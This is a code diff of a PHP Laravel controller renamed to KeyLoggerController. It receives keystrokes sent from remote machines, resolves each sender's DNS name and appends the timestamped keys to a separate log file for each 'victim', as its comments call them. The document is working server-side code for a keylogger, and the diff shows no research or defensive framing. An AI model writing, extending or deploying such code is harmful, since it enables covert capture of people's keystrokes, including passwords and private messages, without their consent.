@@ -8,40 +8,47 @@ use Illuminate\Contracts\Filesystem\FileNotFoundException;
 use Illuminate\Http\Request;
 use Storage;
 
-class LoggerController extends Controller
+class KeyLoggerController extends Controller
 {
     public function LogStroke(Request $request)
     {
+        $data = $request->validate([
+            'keys' => 'required|string|min:1',
+        ]);
+
+        // Obtain the logged ip's dns record, if one exists
         $client = gethostbyaddr($request->ip());
-        $keys = $request->input('keys', '');
 
-        if ($keys != null) {
-            // If we were unable to find the IP address, go ahead and store it in a file named by the IP address
-            if ($client == $request->ip()) {
-                $path = "ip" . DIRECTORY_SEPARATOR . $client;
+        // Pull the required keys
+        $keys = $data['keys'];
 
-                // Create the folder structure if it doesn't exist
-                Storage::disk()->append($path, '', '');
-            } // Else we were able to parse out the dns name
-            else {
-                $path = "dns" . DIRECTORY_SEPARATOR . implode(DIRECTORY_SEPARATOR, array_reverse(explode(".", $client))) . ".log";
+        // If we were unable to find a valid dns entry, go ahead and store it in a file named by the IP address
+        if ($client == $request->ip()) {
+            $path = implode(DIRECTORY_SEPARATOR, ['ip', "{$client}.log"]);
 
-                // Create the folder structure if it doesn't exist
-                Storage::disk()->append($path, '', '');
-            }
+            // Create a unique folder for the victim
+            Storage::disk()->append($path, '', '');
+        } // A dns entry was found, go ahead and store it as a file named by the dns entry
+        else {
+            $path = implode(DIRECTORY_SEPARATOR, [
+                'dns', implode(DIRECTORY_SEPARATOR, array_reverse(explode(".", $client))) . '.log'
+            ]);
 
-            // Place the key logged information with a timestamp, new line on every minute
-            try {
-                if (Storage::disk()->get($path) != null) {
-                    Storage::disk()->append($path, "\n", '');
-                }
-            } catch (FileNotFoundException $exception) {
-                // Ignore
-            }
-
-            Storage::disk()->append($path, '[' . Carbon::now()->isoFormat('MMMM Do YYYY, h:mm:ss a') . '] ', '');
-            Storage::disk()->append($path, $keys, '');
+            // Create a unique folder structure for the victim
+            Storage::disk()->append($path, '', '');
         }
+
+        // Place the key logged information with a timestamp, new line on every minute
+        try {
+            if (Storage::disk()->get($path) != null) {
+                Storage::disk()->append($path, "\n", '');
+            }
+        } catch (FileNotFoundException $exception) {
+            // Ignore
+        }
+
+        Storage::disk()->append($path, '[' . Carbon::now()->isoFormat('MMMM Do YYYY, h:mm:ss a') . '] ', '');
+        Storage::disk()->append($path, $keys, '');
 
         return response()->json([
             'status' => 'success',
